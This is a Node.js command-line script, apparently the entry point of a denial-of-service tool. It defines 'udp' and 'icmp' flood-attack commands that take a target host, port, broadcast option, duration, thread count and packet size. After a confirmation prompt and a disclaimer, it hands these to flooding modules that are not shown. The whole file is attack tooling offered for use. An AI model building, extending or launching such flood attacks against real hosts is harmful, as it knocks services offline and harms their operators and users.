'use strict';

const fs = require('fs');
const readline = require('readline')
    .createInterface({
        input: process.stdin,
        output: process.stdout,
    });

const { program } = require('commander');

const pkg = require('../package.json');
const cst = require('./constants.js');
const udp = require('./protocols/udp.js');
const icmp = require('./protocols/icmp.js');




const confirm = () => {
    return new Promise(async (resolve, reject) => {
        readline.question('CAUTION: Press Y to start the process. [Y/N] ', (yesNo) => {
            readline.close();

            if (yesNo.toUpperCase() !== 'Y') {
                console.log('stop process.');
                process.exit(cst.SUCCESS_EXIT);
            }

            console.log('start process.');
            resolve();
        });
    })
}




program.version(pkg.version)
    .helpOption('-h, --help')
    .usage("<commands> [options] target_host")
    .addHelpText('before', cst.LOGO)
    .showHelpAfterError('(add --help for additional information)');


program.command('udp')
    .summary(`UDP flood attack.`)
    .usage("[options] target_host")
    .addHelpText('after', cst.UDP_USAGE)
    .showHelpAfterError(cst.UDP_ERROR_HELP)
    .helpOption('-h, --help', 'output usage information')

    .option('-p, --port <number>', 'port number', 80)                                       // default 80 port
    .option('-B, --broadcast', 'Set Broadcast Address (UDP)', false)                        // default turn off
    .option('-t, --timeout [string]', 'Usage time(s)', '30')                                // default 30s
    .option('-T, --threads [string]', 'Number of Threads', '10')                            // default 10 Threads
    .option('-s, --size [string]', 'Set packet size(bytes) to sent', '20')    // default 20 Bytes, maximum 1472 Bytes

    .action((options, command) => {
        if (!command.args[0]) {
            console.log(cst.UDP_HELP) // -------- udp help
            process.exit(cst.ERROR_EXIT);
        }

        console.log(cst.LOGO);
        console.log('host: ', command.args[0]);
        console.log('port: ', options.port);
        console.log('broadcast: ', options.broadcast);
        console.log('timeout: ', options.timeout);
        console.log('threads: ', options.threads);
        console.log('size: ', options.size);
        console.log('');
        console.log(cst.DISCLAIMER);


        confirm().then(() => {
            udp(command.args[0], options.port, options.broadcast, options.timeout, options.threads, options.size);
        })
            .catch((error) => {
                console.log(error);
                process.exit(cst.ERROR_EXIT);
            });
    });


program.command('icmp')
    .summary(`ICMP flood attack.`)
    .usage("[options] target_host")
    .addHelpText('after', cst.ICMP_USAGE)
    .showHelpAfterError(cst.ICMP_ERROR_HELP)
    .helpOption('-h, --help', 'output usage information')

    .option('-t, --timeout [string]', 'Usage time(s)', '30')                                // default 30s
    .option('-T, --threads [string]', 'Number of Threads', '10')                            // default 10 Threads
    .option('-s, --size [string]', 'Set packet size(bytes) to sent', '56')                 // default 56 Bytes, maximum 1472 Bytes

    .action((options, command) => {
        if (!command.args[0]) {
            console.log(cst.ICMP_HELP); // -------- udp help
            process.exit(cst.ERROR_EXIT);
        }

        console.log(cst.LOGO);
        console.log('host: ', command.args[0]);
        console.log('timeout: ', options.timeout);
        console.log('threads: ', options.threads);
        console.log('size: ', options.size);
        console.log('');
        console.log(cst.DISCLAIMER);


        confirm().then(() => {
            icmp(command.args[0], options.timeout, options.threads, options.size);
        })
            .catch((error) => {
                console.log(error);
                process.exit(cst.ERROR_EXIT);
            });
    });


program.parse(process.argv);